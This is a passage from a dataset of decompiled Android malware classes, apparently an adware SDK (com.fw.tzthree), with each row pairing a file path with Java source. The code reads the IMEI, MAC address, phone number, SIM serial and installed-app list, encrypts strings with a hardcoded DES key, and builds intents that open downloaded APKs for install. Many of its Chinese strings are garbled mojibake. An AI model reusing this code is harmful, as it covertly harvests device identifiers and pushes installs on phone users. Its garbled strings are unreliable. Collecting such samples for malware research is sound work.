fullScreenAdInfo.setIntro(fullScreenAd.getIntro());     fullScreenAdInfo.setKind(fullScreenAd.getKind());     fullScreenAdInfo.setPackageName(fullScreenAd.getPackageName());     fullScreenAdInfo.setPrintscreen(fullScreenAd.getPrintscreen());     fullScreenAdInfo.setRecommend(fullScreenAd.getRecommend());     fullScreenAdInfo.setShowPeriod(fullScreenAd.getShowPeriod());     fullScreenAdInfo.setUrl(fullScreenAd.getUrl());     fullScreenAdInfo.setWifiSwitches(fullScreenAd.getWifiSwitches());     fullScreenAdInfo.setId(fullScreenAd.getId());     fullScreenAdInfo.setExpires(fullScreenAd.getExpires());     fullScreenAdInfo.setShowTime(fullScreenAd.getShowTime());     fullScreenAdInfo.setFullScreenImg(fullScreenAd.getFullScreenImg());     return fullScreenAdInfo;   }   public static <T extends AdInfo>T a(  PushAd pushAd){     PushAdInfo pushAdInfo=new PushAdInfo();     pushAdInfo.setAdId(pushAd.getAdId());     pushAdInfo.setAppName(pushAd.getAppName());     pushAdInfo.setAppSize(pushAd.getAppSize());     pushAdInfo.setAppVersion(pushAd.getAppVersion());     pushAdInfo.setG2Switches(pushAd.getG2Switches());     pushAdInfo.setG3Switches(pushAd.getG3Switches());     pushAdInfo.setIcon(pushAd.getIcon());     pushAdInfo.setIntro(pushAd.getIntro());     pushAdInfo.setKind(pushAd.getKind());     pushAdInfo.setPackageName(pushAd.getPackageName());     pushAdInfo.setPrintscreen(pushAd.getPrintscreen());     pushAdInfo.setRecommend(pushAd.getRecommend());     pushAdInfo.setShowPeriod(pushAd.getShowPeriod());     pushAdInfo.setUrl(pushAd.getUrl());     pushAdInfo.setWifiSwitches(pushAd.getWifiSwitches());     pushAdInfo.setId(pushAd.getId());     pushAdInfo.setExpires(pushAd.getExpires());     return pushAdInfo;   }   public static DeviceNode a(  DeviceInfo deviceInfo){     DeviceNode deviceNode=new DeviceNode();     deviceNode.setAppKey(deviceInfo.getAppKey());     deviceNode.setDevAppPackage(deviceInfo.getDevAppPackage());     deviceNode.setImei(deviceInfo.getImei());     deviceNode.setMobileSystem(deviceInfo.getMobileSystem());     deviceNode.setNetwork(deviceInfo.getNetwork());     deviceNode.setSdkVersion(deviceInfo.getSdkVersion());     deviceNode.setResolution(deviceInfo.getResolution());     return deviceNode;   }   public static DeviceNode a(  DeviceInfo deviceInfo,  List<Map<String,String>> list){     DeviceNode deviceNode=new DeviceNode();     deviceNode.setAppKey(deviceInfo.getAppKey());     deviceNode.setBrand(deviceInfo.getBrand());     deviceNode.setDevAppPackage(deviceInfo.getDevAppPackage());     deviceNode.setImei(deviceInfo.getImei());     deviceNode.setMobileSystem(deviceInfo.getMobileSystem());     deviceNode.setModel(deviceInfo.getModel());     deviceNode.setNetwork(deviceInfo.getNetwork());     deviceNode.setOperator(deviceInfo.getOperator());     deviceNode.setPhoneNumber(deviceInfo.getPhoneNumber());     deviceNode.setSdkVersion(deviceInfo.getSdkVersion());     deviceNode.setSimSerialNum(deviceInfo.getSimSerialNum());     deviceNode.setAppList(list);     deviceNode.setResolution(deviceInfo.getResolution());     deviceNode.setSystemVersion(deviceInfo.getSystemVersion());     return deviceNode;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\i.code","public class i {   public static String a(  String str,  String str2,  boolean z){     return c.b(a(str,str2),z);   }   public static byte[] a(  String str,  String str2){     try {       SecretKeySpec secretKeySpec=new SecretKeySpec(str2.getBytes(),""DES"");       Cipher cipher=Cipher.getInstance(""DES"");       byte[] bytes=str.getBytes(""utf-8"");       cipher.init(1,secretKeySpec);       return cipher.doFinal(bytes);     }  catch (    UnsupportedEncodingException e) {       e.printStackTrace();       return null;     } catch (    InvalidKeyException e2) {       e2.printStackTrace();       return null;     } catch (    NoSuchAlgorithmException e3) {       e3.printStackTrace();       return null;     } catch (    BadPaddingException e4) {       e4.printStackTrace();       return null;     } catch (    IllegalBlockSizeException e5) {       e5.printStackTrace();       return null;     } catch (    NoSuchPaddingException e6) {       e6.printStackTrace();       return null;     }   }   public static String b(  String str,  String str2,  boolean z){     byte[] b=b(str,str2);     if (b != null) {       return new String(b);     }     return null;   }   public static byte[] b(  String str,  String str2){     try {       SecretKeySpec secretKeySpec=new SecretKeySpec(str2.getBytes(),""DES"");       Cipher cipher=Cipher.getInstance(""DES"");       byte[] a=c.a(str);       cipher.init(2,secretKeySpec);       return cipher.doFinal(a);     }  catch (    InvalidKeyException e) {       e.printStackTrace();       return null;     } catch (    NoSuchAlgorithmException e2) {       e2.printStackTrace();       return null;     } catch (    BadPaddingException e3) {       e3.printStackTrace();       return null;     } catch (    IllegalBlockSizeException e4) {       e4.printStackTrace();       return null;     } catch (    NoSuchPaddingException e5) {       e5.printStackTrace();       return null;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\j.code","public class j {   public static String a=a(""setting"");   public static String b=a(""action"");   public static final String c=a(""log"");   public static final String d=a(""global"");   public static final String e=a(""logic"");   public static final String f=a(""error"");   public static final String g=a(""global_log-"");   public static final String h=a(""down"");   public static final String i=a(""cache"");   public static final String j=a(""request"");   public static final String k=a(""cachelist"");   public static final String l=a(""retry_request"");   public static final String m=a(""DownloadManager is not yet initialize"");   public static final String n=a("" å‡†å¤‡ä¸‹è½½ä¸­ï¼Œè¯·åˆ°é€šçŸ¥æ �æŸ¥çœ‹..."");   public static final String o=a(""ä¸‹è½½å¤±è´¥"");   public static final String p=a(""æ­£åœ¨ä¸‹è½½ "");   public static final String q=a(""å�¯ä»¥å®‰è£…"");   public static final String r=a(""yyyy-MM-dd"");   public static final String s=a(""yyyy-MM-dd HH:mm:ss"");   public static final String t=a(""credits_app"");   public static final String u=a(""credits_game"");   public static final String v=a(""credits_other"");   public static final String w=a(""lastAdId"");   public static final String x=a(""isEnd"");   public static final String y=a(""æŠ±æ­‰ï¼�ç½‘ç»œ"");   public static final String z=a(""å¥½åƒ�æœ‰ç‚¹ä¸�ç»™åŠ›å‘¢~"");   public static final String A=a(""å†�ç»™æˆ‘ä¸€æ¬¡æœºä¼šå�§"");   public static final String B=a(""æ²¡æœ‰å�¯ç­¾åˆ°çš„åº”ç”¨,"");   public static final String C=a(""å¿«åŽ»å®‰è£…å�§ï¼�"");   public static final String D=a(""ä½ å¤ªåŽ‰å®³äº†"");   public static final String E=a(""æ‰€æœ‰çš„ä»»åŠ¡éƒ½å®Œæˆ�äº†"");   public static final String F=a(""èŽ·å�–æ–¹æ³•ï¼š"");   public static final String G=a(""æœªå®Œæˆ�ä»»åŠ¡å‰�å�¸è½½å°†å‰�åŠŸå°½å¼ƒ"");   public static final String H=a(""è¯¥åº”ç”¨æ‚¨å·²ç»�è£…è¿‡å•¦~æ— æ³•èŽ·å�–å¥–åŠ±â€¦"");   public static final String I=a(""è¯¦ç»†ä»‹ç»�ï¼š"");   public static final String J=a(""å°�æ—¶å�Žå�¯ä»¥ç­¾åˆ°"");   public static final String K=a(""ç§’å�Žå�¯ä»¥ç­¾åˆ°"");   public static final String L=a(""åˆ†é’Ÿå�Žå�¯ä»¥ç­¾åˆ°"");   public static final String M=a(""å¹¶èŽ·å¾—"");   public static final String N=a(""å�¯ä»¥ç­¾åˆ°"");   public static final String O=a(""å·²åˆ°ç­¾åˆ°ä¸Šé™�ï¼Œä¸�å†�èŽ·å�–ç§¯åˆ†"");   public static final String P=a(""æ‚¨è¿˜æœªåˆ°å�¯ç­¾åˆ°æ—¶é—´,æ­¤æ¬¡ç­¾åˆ°ä¸�èŽ·å¾—ç§¯åˆ†"");   public static final String Q=a(""æ‰“\tå¼€"");   public static final String R=a(""å®‰è£…æ³¨å†Œ"");   public static final String S=a(""ä¸‹ \tè½½"");   public static final String T=a(""ç­¾åˆ°ï¼ˆä½¿ç”¨ä¸¤åˆ†é’Ÿä»¥ä¸Šï¼‰"");   public static final String U=a(""èŽ·  å�–"");   public static final String V=a(""ä¸‹è½½æˆ�åŠŸ"");   public static final String W=a(""ä¸‹è½½å¤±è´¥"");   public static final String X=a(""æ­£åœ¨åŠªåŠ›ä¸‹è½½ä¸­"");   public static final String Y=a(""å¡«æ–‡å­—"");   public static final String Z=a(""å…�è´¹èŽ·å�–ç§¯åˆ†"");   public static final String aa=a(""çƒ­é—¨åº”ç”¨"");   public static final String ab=a(""çƒ­é—¨æ¸¸æˆ�"");   public static final String ac=a(""ç­¾åˆ°ä»»åŠ¡"");   public static final String ad=a(""å·²å®Œæˆ�"");   public static final String ae=a(""éœ€è¯•ç”¨"");   public static final String af=a(""isNoShowBoot"");   public static final String ag=a(""number"");   public static final String ah=a(""ç‰ˆæœ¬: "");   public static final String ai=a(""å¤§å°�: "");   public static final String aj=a(""Mb"");   public static final String ak=a(""adInfo"");   public static final String al=a(""resourcesAddr"");   public static final String am=a(""adType"");   public static final String an=a(""dm_la_title_back.png"");   public static final String ao=a(""dm_credits_icon.png"");   public static final String ap=a(""dm_la_horizontal_line.png"");   public static final String aq=a(""dm_la_vertical_line.png"");   public static final String ar=a(""dm_la_tv_bg.png"");   public static final String as=a(""dm_safety_certification.png"");   public static final String at=a(""dm_da_new_notifi.9.png"");   public static final String au=a(""dm_da_new_notifi_push.9.png"");   public static final String av=a(""dm_la_horizontal_line_push.png"");   public static final String aw=a(""dm_la_title_back_push.png"");   public static final String ax=a(""dm_notifi_btn_push.9.png"");   public static final String ay=a(""dm_notifi_pressed_btn_push.9.png"");   public static final String az=a(""dm_safety_certification_push.png"");   public static final String aA=a(""dm_notifi_btn.9.png"");   public static final String aB=a(""dm_notifi_pressed_btn.9.png"");   public static final String aC=a(""dm_load_more_bg.png"");   public static final String aD=a(""æ¯�æ—¥"");   public static final String aE=a(""æ¬¡èŽ·å�–ç§¯åˆ†çš„æœºä¼šå·²ç”¨å®Œâ€¦"");   public static final String aF=a(""ä»Šæ—¥å®‰è£…ä¸�å†�èŽ·å�–ç§¯åˆ†"");   public static final String aG=a(""èµžï¼�å®‰è£…æˆ�åŠŸå•¦~æ³¨å†Œæ–°è´¦å�·~"");   public static final String aH=a(""å°±èƒ½èŽ·å�–ç§¯åˆ†å’¯~"");   public static final String aI=a(""å¥½å�§"");   public static final String aJ=a(""ç§¯åˆ†ä¸�å¤Ÿäº†å�§ï¼Ÿ"");   public static final String aK=a(""æ‰¾æˆ‘èŽ·å�–ç§¯åˆ†!"");   public static final String aL=a(""dm_cancle_icon.png"");   public static final String aM=a(""è¯¥æœ�åŠ¡æš‚æ—¶å…³é—­"");   public static final String aN=a(""è¯·ç¨�å€™åˆ·æ–°"");   public static final String aO=a(""æ‚¨ç”³è¯·çš„appKeyæš‚æœªé€šè¿‡å®¡æ ¸"");   public static final String aP=a(""è¯·æŸ¥çœ‹appKeyçš„å®¡æ ¸çŠ¶æ€�"");   public static final String aQ=a(""å±•å¼€ âˆ¨"");   public static final String aR=a(""æ”¶èµ· âˆ§"");   public static final String aS=a(""ç§¯åˆ†"");   public static final String aT=a(""æ›´å¤š"");   public static final String aU=a(""å¾…ç­¾åˆ°"");   public static final String aV=a(""å�¯ç­¾åˆ°"");   public static final String aW=a(""æ‰“ å¼€"");   public static final String aX=a(""å·²å…¨éƒ¨åˆ°æ‰‹ï¼ŒåŽ»å¯»æ‰¾æ–°ä»»åŠ¡å�§~"");   public static final String aY=a(""å·²å�¸è½½ï¼Œæ— APKï¼šè¯·é‡�æ–°ä¸‹è½½è¯¥åº”ç”¨ï¼Œç­¾åˆ°æœ‰ç§¯åˆ†~"");   public static final String aZ=a(""å·²å�¸è½½ï¼Œæœ‰APKï¼šè¯·é‡�æ–°å®‰è£…è¯¥åº”ç”¨ï¼Œç­¾åˆ°æœ‰ç§¯åˆ†~"");   public static final String ba=a(""ç½‘ç»œä¸­æ–­ï¼Œè¯·è�”ç½‘é‡�æ–°ç™»å½•"");   public static final String bb=a(""æ”¯ä»˜æˆ�åŠŸèŽ·å¾—"");   public static final String bc=a(""packageName"");   public static final String bd=a(""appName"");   public static final String be=a(""dm_cover_download_normal.png,dm_cover_download_pressed.png"");   public static final String bf=a(""dm_cover_open_normal.png,dm_cover_open_pressed.png"");   public static final String bg=a(""dm_cover_logo_normal.png,dm_cover_logo_open.png"");   public static final String bh=a(""dm_cover_close.png"");   public static final String bi=a(""push"");   public static final String bj=a(""Service onCreate..."");   public static final String bk=a("" æ¬¡æŽ¨é€�æˆ�åŠŸï¼Œæ­£åœ¨ä¸‹è½½..."");   public static final String bl=a("" æ¬¡å‡†å¤‡ä¸­ï¼Œä¸Šæ¬¡æŽ¨é€�æ—¶é—´:"");   public static final String bm=a("" æ¬¡æŽ¨é€�å¤±è´¥ï¼Œæ²¡æœ‰ç½‘ç»œ"");   public static final String bn=a("" æ¬¡æŽ¨é€�å¤±è´¥ï¼Œæ²¡æœ‰å�¯æŽ¨é€�æ•°æ�®"");   public static final String bo=a("" æ¬¡æŽ¨é€�å¤±è´¥ï¼Œè¶…è¿‡æœ€å¤§æŽ¨é€�æ¬¡æ•°ï¼š"");   public static final String bp=a("" ä¸€å¤©å†…æœ‰è¿‡wifiå¹¶ä¸”å½“å‰�ä¸�æ˜¯wifiï¼Œä¸�æŽ¨é€�"");   public static final String bq=a(""æŽ¨é€�å¤±è´¥ï¼Œä¸¤æ¬¡æŽ¨é€�æ—¶é—´å°�äºŽ:"");   public static final String br=a(""æŽ¨é€�å¤±è´¥ï¼Œä¸�åœ¨æŽ¨é€�æ—¶é—´æ®µå†…"");   public static final String bs=a(""å�¯ä»¥æŽ¨é€�ï¼Œæœ€å¤§æŽ¨é€�æ¬¡æ•°ä¸ºï¼š"");   public static final String bt=a("" æ¬¡ä¸‹è½½å®Œæˆ�ï¼Œå�‘å‡ºæŽ¨é€�"");   public static final String bu=a("" æ¬¡pushæŽ¨é€�å¤±è´¥ï¼Œä¸‹è½½é”™è¯¯ï¼Œç›´æŽ¥æŽ¨é€�..."");   public static final String bv=a(""åŠ è½½å¤±è´¥"");   public static final String bw=a(""appDir"");   public static final String bx=a(""webUrl"");   public static final String by=a(""adInfo"");   public static final String bz=a(""baseUrl"");   public static final String bA=a(""data"");   public static final String bB=a(""install_apk"");   public static final String bC=a(""open_web"");   public static final String bD=a(""download_apk"");   public static final String bE=a(""download_apk_progress"");   public static final String bF=a(""init"");   public static final String bG=a(""destroy"");   public static final String bH=a(""onAdClicked"");   public static final String bI=a(""ä¸ºç¼“å­˜æ·»åŠ å·²å®‰è£…ç¨‹åº�å¤±è´¥ï¼Œæ²¡æœ‰æ‰¾åˆ°å·²å®‰è£…ç¨‹åº�çš„ç¼“å­˜åˆ—è¡¨ï¼Œä¸�å�šå¹¿å‘ŠæŽ’é™¤å¤„ç�†"");   public static final String bJ=a(""æ·»åŠ å®‰è£…è½¯ä»¶åˆ°è½¯ä»¶åˆ—è¡¨:"");   public static final String bK=a(""æŽ’é™¤å·²å®‰è£…çš„packageNameï¼š"");   public static final String bL=a(""å¹¿å‘Šå·²ç»�å…¨éƒ¨å±•ç¤ºå®Œæ¯•ï¼Œå†™å…¥å�˜é‡�"");   public static final String bM=a("" å†…å­˜è¢«é”€æ¯�ï¼ˆå¼‚å¸¸ï¼‰ï¼Œé‡�æ–°init..."");   public static final String bN=a(""åˆ é™¤cachelistæ•°æ�®æˆ�åŠŸ: "");   public static final String bO=a(""ä¸‹è½½æˆ�åŠŸ (packagename, id, size)(å�¯èƒ½æ‰“å�°ä¸¤æ¬¡log) :"");   public static final String bP=a("" è¢«å®‰è£…ï¼Œå¼€å…³:"");   public static final String bQ=a(""æ–‡ä»¶æ ¡éªŒå¤±è´¥"");   public static final String bR=a("" è¯·é‡�è¯•"");   public static final String bS=a(""ç½‘ç»œå¼‚å¸¸"");   public static final String bT=a(""è½¯ä»¶è¢«å®‰è£…ï¼Œä¸�æ˜¯å�ˆæ ¼çš„è½¯ä»¶ï¼ŒgetBusinssBuilder ä¸ºç©º:"");   public static final String bU=a(""è½¯ä»¶è¢«å®‰è£…ï¼Œä¸�æ˜¯å�ˆæ ¼çš„è½¯ä»¶ï¼Œä»Žå†…å­˜ä¸­èŽ·å�–èŽ·å�–appInfoä¸ºç©º:"");   public static final String bV=a(""è½¯ä»¶è¢«å®‰è£…ï¼Œä¸�æ˜¯å�ˆæ ¼çš„è½¯ä»¶ï¼Œè¶…è¿‡è§„å®šçš„æ—¶é—´äº†:"");   public static final String bW=a(""å¹¿å‘Š"");   public static final String bX=a(""ç§’"");   public static final String bY=a(""è·³è¿‡"");   public static final String bZ=a(""è¯·è¿žæŽ¥ç½‘ç»œ"");   public static final String ca=a(""å¥½çš„"");   public static final String cb=a(""å�–æ¶ˆ"");   public static final String cc=a(""å¼€å§‹ä¸‹è½½"");   public static final String cd=a(""æµ�è§ˆ"");   public static final String ce=a(""ç½‘é¡µ"");   public static String a(  String str){     if (TextUtils.isEmpty(k.a)) {       return str;     }     try {       return k.b(str,k.a);     }  catch (    Exception e2) {       return str;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\k.code","public class k {   public static String a=""k9za1bc1woyhadbqxat4"";   public static java.lang.String a(  java.lang.String r7,  java.lang.String r8){     throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.d.k.a(java.lang.String, java.lang.String):java.lang.String"");   }   public static java.lang.String b(  java.lang.String r7,  java.lang.String r8){     throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.d.k.b(java.lang.String, java.lang.String):java.lang.String"");   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\l.code","public class l {   public static String a(  Context context){     try {       return ((WifiManager)context.getSystemService(""wifi"")).getConnectionInfo().getMacAddress();     }  catch (    Exception e) {       s.a(e);       return null;     }   }   public static String a(  Context context,  TelephonyManager telephonyManager){     String str=null;     try {       str=telephonyManager.getDeviceId();     }  catch (    Exception e) {       s.a(e);     }     if (TextUtils.isEmpty(str)) {       str=a(context);     }     return TextUtils.isEmpty(str) ? ""123"" : str;   }   public static String b(  Context context){     DisplayMetrics displayMetrics=new DisplayMetrics();     ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);     return displayMetrics.widthPixels + ""*"" + displayMetrics.heightPixels;   }   public static String b(  Context context,  TelephonyManager telephonyManager){     try {       return telephonyManager.getLine1Number();     }  catch (    Exception e) {       s.a(e);       return """";     }   }   public static String c(  Context context,  TelephonyManager telephonyManager){     try {       return telephonyManager.getSimSerialNumber();     }  catch (    Exception e) {       s.a(e);       return """";     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\m.code","public class m {   public static void a(  Context context,  AdInfo adInfo,  int i,  int i2){     context.startService(r.a(context,i2,adInfo,i,false,false));   }   public static void a(  Context context,  AdInfo adInfo,  int i,  int i2,  boolean z){     context.startService(r.a(context,i2,adInfo,i,false,z));   }   public static void b(  Context context,  AdInfo adInfo,  int i,  int i2){     context.startService(r.a(context,i2,adInfo,i,true,false));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\n.code","public class n {   public static int a(  Context context,  float f){     return (int)((context.getResources().getDisplayMetrics().density * f) + 0.5f);   }   public static Bitmap a(  Bitmap bitmap,  float f){     int width=bitmap.getWidth();     int height=bitmap.getHeight();     Matrix matrix=new Matrix();     matrix.postRotate(f);     return Bitmap.createBitmap(bitmap,0,0,width,height,matrix,true);   }   public static Bitmap a(  Bitmap bitmap,  int i,  int i2){     return (bitmap.getWidth() == i && bitmap.getHeight() == i2) ? bitmap : Bitmap.createScaledBitmap(bitmap,i,i2,true);   }   public static Bitmap a(  Drawable drawable){     Bitmap createBitmap=Bitmap.createBitmap(drawable.getIntrinsicWidth(),drawable.getIntrinsicHeight(),drawable.getOpacity() != -1 ? Bitmap.Config.ARGB_8888 : Bitmap.Config.RGB_565);     Canvas canvas=new Canvas(createBitmap);     drawable.setBounds(0,0,drawable.getIntrinsicWidth(),drawable.getIntrinsicHeight());     drawable.draw(canvas);     return createBitmap;   }   public static Drawable a(  Context context,  Bitmap bitmap){     return new BitmapDrawable(context.getResources(),bitmap);   }   public static void a(  Context context,  String str,  q qVar){     SmartImageTask smartImageTask=new SmartImageTask(context,new WebImage(str));     smartImageTask.setOnCompleteHandler(new o(qVar));     SmartImageView.threadPool.execute(smartImageTask);   }   public static String[] a(  String str,  String str2){     int i;     int abs;     String[] split=str.split(""\\*"");     String str3=split[0];     String str4=split[1];     String[] split2=str2.split("";"");     int i2=Integer.MAX_VALUE;     String str5=null;     int length=split2.length;     int i3=0;     while (i3 < length) {       String str6=split2[i3];       String[] split3=str6.split("":"");       if (split3 == null || split3.length < 2 || (abs=Math.abs(Integer.parseInt(split3[0].split(""\\*"")[0]) - Integer.parseInt(str3))) >= i2) {         str6=str5;         i=i2;       }  else {         i=abs;       }       i3++;       i2=i;       str5=str6;     }     return str5.split("":"");   }   public static Bitmap b(  Bitmap bitmap,  int i,  int i2){     int width=bitmap.getWidth();     int height=bitmap.getHeight();     Matrix matrix=new Matrix();     float f=i / width;     matrix.postScale(f,f);     return Bitmap.createBitmap(bitmap,0,0,width,height,matrix,true);   }   public static void b(  Context context,  String str,  q qVar){     SmartImageTask smartImageTask=new SmartImageTask(context,new WebImage(str));     smartImageTask.setOnCompleteHandler(new p(qVar));     SmartImageView.threadPool.execute(smartImageTask);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\o.code","final class o extends SmartImageTask.OnCompleteHandler {   final q a;   public o(  q qVar){     this.a=qVar;   }   @Override public void onComplete(  Bitmap bitmap){     if (bitmap == null || this.a == null) {       return;     }     this.a.a(bitmap);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\p.code","final class p extends SmartImageTask.OnCompleteHandler {   final q a;   public p(  q qVar){     this.a=qVar;   }   @Override public void onComplete(  Bitmap bitmap){     if (this.a != null) {       this.a.a(bitmap);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\q.code","public interface q {   void a(  Bitmap bitmap); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\r.code","public class r {   public static PendingIntent a(  Context context,  Intent intent){     return PendingIntent.getActivity(context,new Random().nextInt(1000),intent,134217728);   }   public static Intent a(  Context context,  int i,  AdInfo adInfo,  int i2,  boolean z,  boolean z2){     Intent intent=new Intent(context,(Class<?>)FwDservice.class);     intent.putExtra(""033C9AA179013A52D68F761D575E5A4A"",i);     intent.putExtra(com.fw.tzthree.b.a.aX,adInfo);     intent.putExtra(com.fw.tzthree.b.a.ba,i2);     intent.putExtra(com.fw.tzthree.b.a.bm,z2);     if (z) {       intent.putExtra(com.fw.tzthree.b.a.bi,true);     }     return intent;   }   public static Intent a(  File file){     Intent intent=new Intent();     intent.addFlags(268435456);     intent.setAction(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(file),""application/vnd.android.package-archive"");     return intent;   }   public static void a(  Context context,  String str){     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.setData(Uri.parse(str));     intent.setComponent(null);     List<ResolveInfo> queryIntentActivities=context.getPackageManager().queryIntentActivities(intent,65600);     if (queryIntentActivities.size() > 0) {       ResolveInfo resolveInfo=queryIntentActivities.get(0);       intent.setClassName(resolveInfo.activityInfo.packageName,resolveInfo.activityInfo.name);     }     context.startActivity(intent);   }   public static PendingIntent b(  Context context,  Intent intent){     return PendingIntent.getService(context,new Random().nextInt(1000),intent,134217728);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\s.code","public class s {   public static int a=5;   private static boolean b=false;   private static boolean c=false;   private static String d=Environment.getExternalStorageDirectory().getPath() + File.separator + ""bayimob"";   private static final SimpleDateFormat e=new SimpleDateFormat(""yyyyMMdd"",Locale.getDefault());   private static boolean f=true;   private static String g="""";   private static int h=0;   private static int i=6291456;   private static Pattern j=Pattern.compile(""(\\w+/)+"");   public static final void a(  Exception exc){     if (a <= 5) {       Log.e(b(exc),c(exc));       if (b) {         t.a(exc);       }     }   }   public static final void a(  String str){     if (a <= 3) {       Log.i(e(str),str);       if (b) {         t.a(str);       }     }   }   public static final void a(  String str,  String str2){     if (a <= 5) {       try {         Log.d(str,str2);       }  catch (      Exception e2) {       }     }   }   private static String b(  Exception exc){     if (exc == null) {       return ""[null]"";     }     if (exc.getStackTrace().length <= 0) {       return ""[exception]"";     }     String className=exc.getStackTrace()[0].getClassName();     return ""["" + className.substring(className.lastIndexOf(""."") + 1) + ""]"";   }   public static final void b(  String str){     if (a <= 5) {       Log.e(e(str),str);       if (c) {         t.b(str);       }     }   }   public static final void b(  String str,  String str2){     if (a <= 4) {       Log.d(str,str2);     }   }   private static String c(  Exception exc){     StringBuilder sb=new StringBuilder();     StackTraceElement[] stackTrace=exc.getStackTrace();     sb.append(""\n"");     sb.append(exc.toString());     sb.append(""\n"");     int i2=0;     for (    StackTraceElement stackTraceElement : stackTrace) {       sb.append(stackTraceElement.getClassName());       sb.append(""."");       sb.append(stackTraceElement.getMethodName());       sb.append(""["");       sb.append(stackTraceElement.getLineNumber());       sb.append(""]"");       sb.append(""\n"");       i2++;       if (i2 >= 2) {         break;       }     }     if (exc.getCause() != null) {       sb.append(""Caused by: "");       sb.append(exc.getMessage());     }     return sb.toString();   }   public static boolean c(  String str,  String str2){     return t.a(str,str2);   }   public static String e(  String str){     if (str == null || Thread.currentThread().getStackTrace().length <= 0) {       return ""[null]"";     }     String className=Thread.currentThread().getStackTrace()[0].getClassName();     return ""["" + className.substring(className.lastIndexOf(""."") + 1) + ""]"";   }   public static String f(){     return e.format(new Date());   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\t.code","public class t {   private static final File a(){     String str;     boolean z;     String str2;     String f;     String str3;     int i;     str=s.d;     if ("""".equals(str)) {       return null;     } synchronized (s.class) {       z=s.f;       if (!z) {         str3=s.g;         File file=new File(str3);         long length=file.length();         i=s.i;         if (length < i) {           return file;         }         boolean unused=s.f=true;         return a();       }       str2=s.d;       File file2=new File(str2);       if (!file2.exists()) {         file2.mkdirs();       }       StringBuilder sb=new StringBuilder();       f=s.f();       File file3=new File(file2,sb.append(f).append("".txt"").toString());       if (!file3.exists()) {         try {           file3.createNewFile();           int unused2=s.h=0;           boolean unused3=s.f=false;           String unused4=s.g=file3.getAbsolutePath();         }  catch (        IOException e) {           c(""createFile error , "" + e.getMessage());         }       }       return file3;     }   }   private static final File a(  boolean z,  String str){     String str2;     String str3;     File file;     String f;     str2=s.d;     if ("""".equals(str2)) {       return null;     }     str3=s.d;     File file2=new File(str3);     if (!file2.exists()) {       file2.mkdirs();     }     if (z) {       StringBuilder sb=new StringBuilder();       f=s.f();       file=new File(file2,sb.append(f).append(str).append("".txt"").toString());     }  else {       file=new File(file2,str + "".iso"");     }     if (file.exists()) {       return file;     }     try {       file.createNewFile();       int unused=s.h=0;       boolean unused2=s.f=false;       String unused3=s.g=file.getAbsolutePath();       return file;     }  catch (    IOException e) {       c(""createFile error , "" + e.getMessage());       return file;     }   }   public static synchronized void a(  Exception exc){ synchronized (t.class) {       File a=a();       if (a != null) {         try {           FileWriter fileWriter=new FileWriter(a,true);           PrintWriter printWriter=new PrintWriter(fileWriter);           printWriter.append(""\n"");           exc.printStackTrace(printWriter);           printWriter.flush();           printWriter.close();           fileWriter.close();         }  catch (        IOException e) {           c(""writeLog error, "" + e.getMessage());         }       }  else {         c(""writeLog error, due to the file dir is error"");       }     }   }   public static synchronized void a(  String str){ synchronized (t.class) {       File a=a();       if (a != null) {         try {           FileWriter fileWriter=new FileWriter(a,true);           BufferedWriter bufferedWriter=new BufferedWriter(fileWriter);           bufferedWriter.append((CharSequence)""\n"");           bufferedWriter.append((CharSequence)str);           bufferedWriter.append((CharSequence)""\n"");           bufferedWriter.flush();           bufferedWriter.close();           fileWriter.close();         }  catch (        IOException e) {           c(""writeLog error, "" + e.getMessage());         }       }  else {         c(""writeLog error, due to the file dir is error"");       }     }   }   public static boolean a(  String str,  String str2){     File a=a(false,str);     if (a == null) {       c(""writeLog error, due to the file dir is error"");       return false;     }     try {       String a2=k.a(str2,com.fw.tzthree.b.a.bz);       FileWriter fileWriter=new FileWriter(a,true);       BufferedWriter bufferedWriter=new BufferedWriter(fileWriter);       bufferedWriter.append((CharSequence)a2);       bufferedWriter.append((CharSequence)""\t\n"");       bufferedWriter.flush();       bufferedWriter.close();       fileWriter.close();       return true;     }  catch (    Exception e) {       c(""writeLog error, "" + e.getMessage());       return false;     }   }   private static final File b(){     String str;     boolean z;     String str2;     String f;     String str3;     int i;     str=s.d;     if ("""".equals(str)) {       return null;     } synchronized (s.class) {       z=s.f;       if (!z) {         str3=s.g;         File file=new File(str3);         long length=file.length();         i=s.i;         if (length < i) {           return file;         }         boolean unused=s.f=true;         return a();       }       str2=s.d;       File file2=new File(str2);       if (!file2.exists()) {         file2.mkdirs();       }       StringBuilder sb=new 